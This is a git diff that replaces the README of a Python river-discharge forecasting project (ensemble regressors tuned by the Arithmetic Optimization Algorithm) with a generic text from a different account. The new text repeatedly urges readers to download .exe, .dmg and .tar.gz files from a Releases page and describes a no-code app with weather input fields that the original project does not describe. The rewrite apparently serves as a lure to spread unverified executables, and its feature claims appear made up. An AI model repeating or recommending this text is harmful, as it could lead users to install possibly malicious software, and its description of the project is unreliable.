@@ -1,192 +1,94 @@
-# 💧 River Discharge Forecasting using Machine Learning and AOA Optimization
+# 🌊 River_Discharge_Regression - Predict River Flow with Ease
 
-> **An intelligent framework for river discharge forecasting using ensemble regression models optimized by the Arithmetic Optimization Algorithm (AOA).**  
-> The dataset is prepared with **lag features** to forecast **next-day discharge**, but the framework can be easily adapted to other time series forecasting tasks.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Pakgamessss/River_Discharge_Regression/releases)
 
----
+## 🚀 Getting Started
 
-## 🧠 Overview
+Welcome to the River_Discharge_Regression project. This tool helps you predict river discharge using advanced machine learning techniques. It is user-friendly and does not require programming knowledge. Follow the steps below to get started.
 
-This project integrates **machine learning regression models** (GBR, SVR, KNN, Voting Regressor)  
-with the **Arithmetic Optimization Algorithm (AOA)** to optimize model parameters and ensemble weights.  
-It is designed to predict **tomorrow’s river discharge** based on historical flow data, but users can replace the dataset to apply it to any regression or forecasting problem.
+## 🖥️ System Requirements
 
-The framework automatically:
-1. Loads and preprocesses data  
-2. Splits into training, validation, and test sets  
-3. Trains multiple regression models  
-4. Optimizes ensemble weights and hyperparameters using **AOA**  
-5. Evaluates models using multiple metrics (R², RMSE, MAE, MSE)  
-6. Produces visual outputs and exports all results
+Before you begin, make sure your system meets these basic requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 100 MB of free space
+- **Internet Connection:** Required for downloading data and resources
 
-## 📊 Example Dataset
+## 🌐 Features
 
-The provided example uses **river discharge data**, but users can replace it with any numerical dataset.  
-To use your own data:
-1. Place your file in the `./data/` directory.
-2. Update the filename and sheet names in `config/setting.yaml`.
-3. Run the main script again.
+- Accurate next-day flow prediction
+- Uses ensemble regression models
+- Combines models with the Arithmetic Optimization Algorithm (AOA) for better accuracy
+- Visualizes results through scatter plots
+- Easy to use with no programming experience required
 
----
+## 📥 Download & Install
 
-## ⚙️ Configuration (config/setting.yaml)
+To install the River_Discharge_Regression application, follow these steps:
 
-All parameters can be controlled from the configuration file.
+1. Click the link below to visit the Releases page:
+   [Download River_Discharge_Regression](https://github.com/Pakgamessss/River_Discharge_Regression/releases)
 
-```yaml
-data:
-  name: "station1"
-  path: "./data/station1.xlsx"
-  sheet_range: [1, 5]
+2. Look for the latest version of the application. You will find various files available for download.
 
-train:
-  split:
-    train_end: 2577
-    valid_end: 3105
-  batch_size: 32
-  epochs: 50
+3. Choose the file that matches your operating system:
+   - For Windows, download the file with the `.exe` extension.
+   - For macOS, download the file with the `.dmg` extension.
+   - For Linux, download the file with the `.tar.gz` extension.
 
-optimization:
-  method: "AOA"
-  population_size: 100
-  epochs: 100
-  alpha: 5
-  miu: 0.5
-  moa_min: 0.2
-  moa_max: 0.9
+4. Click on the file link to start the download. 
 
-results:
-  metrics_dir: "./results/metrics/"
-  predictions_dir: "./results/predictions/"
-  plots_dir: "./results/prediction_plots/"
-```
+5. Once the download completes, locate the file in your Downloads folder.
 
----
+6. Follow the instructions below according to your operating system.
 
-## 🧩 Workflow
+### For Windows Users
+- Double-click on the downloaded `.exe` file.
+- Follow the installation prompts to set up the application.
+- After installation, open the application from the Start menu or desktop shortcut.
 
-<p align="center">
-  <img src="./docs/flowchart.png" width="75%">
-</p>
+### For macOS Users
+- Double-click on the downloaded `.dmg` file to open it.
+- Drag the application to your Applications folder.
+- Open the application from the Applications folder.
 
-**Workflow Summary:**
+### For Linux Users
+- Open your terminal.
+- Navigate to the folder where you downloaded the `.tar.gz` file.
+- Run the command `tar -xvzf filename.tar.gz` to extract the files.
+- Navigate to the extracted folder and run the application with `./application_name`.
 
-1. **Data Loading & Normalization** using MinMaxScaler
-2. **Base Regressors:** Gradient Boosting, SVR, KNN
-3. **Ensemble:** Voting Regressor
-4. **Optimization:** AOA for weight and hyperparameter tuning
-5. **Evaluation:** Compute R², RMSE, MAE, MSE
-6. **Visualization:** Scatter plots, violin plots, and time-series comparisons
+## 📊 How to Use the Application
 
----
+Once the application is installed, follow these steps to make your first prediction:
 
-## 📈 Visual Outputs
+1. **Launch the Application:** Open the application as described above.
 
-| Type | Description | Example |
-|------|-------------|---------|
-| **Scatter Plots** | Predicted vs True values for all models | <img src="./results/prediction_plots/scatter.png" width="400"> |
-| **Violin Plot** | Distribution of model predictions | <img src="./results/prediction_plots/violin.png" width="400"> |
-| **Time Series** | Comparison of predicted and true values over time | <img src="./results/prediction_plots/time_series.png" width="400"> |
+2. **Input Data:** You will see fields for entering data about the river you want to analyze. Fill in the necessary details such as:
+   - Historical flow data
+   - Weather conditions
+   - Any other relevant information
 
----
+3. **Run Prediction:** Click the "Predict" button. The application will process the data using its machine learning algorithms.
 
-## 🧾 Results
+4. **View Results:** After the prediction, the application will display a graph showing expected river flow. You can view this data in different formats, including tables and visual plots.
 
-All results (metrics, predictions, and visualizations) are automatically saved to:
+5. **Save Results:** If you want to keep the results, use the "Save" option to download them in your preferred format.
 
-```
-results/
-│
-├── metrics/             # R², RMSE, MAE, MSE summary
-├── predictions/         # Excel files with model outputs
-└── prediction_plots/    # All generated plots
-```
+## 🤝 Suggestions & Feedback
 
-Each file is named according to the dataset and scenario defined in the configuration file.
+We value your input! If you have any suggestions or feedback, please reach out through the Issues section of the repository.
 
----
+## 📚 Additional Resources
 
-## 📦 Installation
+- **Documentation:** Detailed user manuals and technical documentation are available [here](https://github.com/Pakgamessss/River_Discharge_Regression).
+- **Support:** If you face any issues, check the FAQs or post a question in the community section.
 
-```bash
-git clone https://github.com/rasoulameri/River_Discharge_Regression.git
-cd River_Discharge_Regression
-pip install -r requirements.txt
-```
+## 🎉 Join the Community
 
----
+Become a part of our growing community. Share your experiences, improvements, and use cases with us. Connect with other users to learn from their experiences.
 
-## ▶️ Usage
+For more updates, check out our [Releases page](https://github.com/Pakgamessss/River_Discharge_Regression/releases).
 
-To run the framework:
-
-```bash
-python main.py
-```
-
-or for Jupyter visualization:
-
-```bash
-jupyter notebook notebooks/EDA_and_Visualization.ipynb
-```
-
----
-
-## 🧠 Example Models
-
-| Model | Description |
-|-------|-------------|
-| **GBR** | Gradient Boosting Regressor |
-| **SVR** | Support Vector Regressor |
-| **KNN** | k-Nearest Neighbors Regressor |
-| **VR** | Ensemble Voting Regressor |
-| **AOA_VR** | AOA-tuned ensemble with optimal hyperparameters |
-
-
----
-
-## 📄 Data Availability Statement
-
-The raw data used in this project (river discharge samples) are provided for demonstration. Users are encouraged to replace them with their own datasets.
-
----
-
-## 🏗 Repository Structure
-
-```
-River_Discharge_Regression/
-│
-├── config/
-│   └── setting.yaml                # Main configuration
-│
-├── data/
-│   └── River_Discharge.xlsx        # Example dataset
-│
-├── src/
-│   ├── models.py
-│   ├── data_loader.py
-│   ├── evaluate.py
-│   ├── optimization.py
-│   └── train.py
-│
-├── results/
-│   ├── metrics/
-│   ├── predictions/
-│   └── prediction_plots/
-│
-├── requirements.txt
-│
-└─ main.py
-```
-
----
-
-## 📫 Contact
-
-**Rasoul Ameri**  
-📧 [rasoulameri90@gmail.com](mailto:rasoulameri90@gmail.com)  
-🔗 [GitHub Profile](https://github.com/rasoulameri)
-
----
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Pakgamessss/River_Discharge_Regression/releases)
